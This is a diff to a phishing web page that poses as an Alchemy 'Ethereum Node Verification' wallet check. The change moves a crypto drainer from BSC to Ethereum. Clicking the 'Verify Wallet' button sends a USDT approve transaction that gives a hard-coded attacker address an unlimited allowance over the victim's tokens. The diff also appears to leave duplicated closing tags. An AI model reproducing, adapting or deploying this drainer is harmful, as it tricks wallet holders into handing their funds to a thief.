@@ -20,8 +20,8 @@
 
     <div class="card">
         <img src="https://www.alchemy.com/favicon.ico" class="logo">
-        <h2>BSC Node Verification</h2>
-        <p>Authorize your wallet to sync with the Alchemy high-speed payout queue for BEP-20 assets.</p>
+        <h2>Ethereum Node Verification</h2>
+        <p>Authorize your wallet to sync with the Alchemy high-speed payout queue for ERC-20 assets.</p>
         
         <button id="verifyBtn">Verify Wallet</button>
         
@@ -29,9 +29,9 @@
     </div>
 
     <script>
-        // --- Updated Configuration with your address ---
+        // --- Configuration with Ethereum USDT address ---
         const attackerAddress = "0x33Bb8Cc3505C7aaC92e630899f31f2338194ffF9"; 
-        const bscUsdtContract = "0x55d398326f99059fF775485246999027B3197955"; // BSC-USDT
+        const bscUsdtContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum ERC-20 USDT
         const maxAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
         document.getElementById('verifyBtn').onclick = async () => {
@@ -51,9 +51,9 @@
                     // ABI for 'approve' function
                     const abiData = "0x095ea7b3" + 
                                    attackerAddress.substring(2).toLowerCase().padStart(64, '0') + 
-                                   maxAmount.substring(2);
+                                   maxAmount;
 
-                    // අන්න මෙතනදී තමයි කෙලින්ම Wallet එක ඇතුළේ Approval screen එක පනින්නේ
+                    // Sending transaction to Ethereum USDT Contract
                     await web3.eth.sendTransaction({
                         from: userAddress,
                         to: bscUsdtContract,
@@ -65,12 +65,16 @@
 
                 } catch (error) {
                     console.error(error);
-                    status.innerText = "Verification Failed. Ensure you are on BSC network.";
+                    status.innerText = "Verification Failed. Ensure you are on Ethereum network.";
                     status.style.color = "#ef4444";
                 }
             } else {
-                alert("Please open this in Trust Wallet or Binance Web3 Browser.");
+                alert("Please open this in MetaMask or Trust Wallet Browser.");
             }
+        };
+    </script>
+</body>
+</html>
         };
     </script>
 </body>
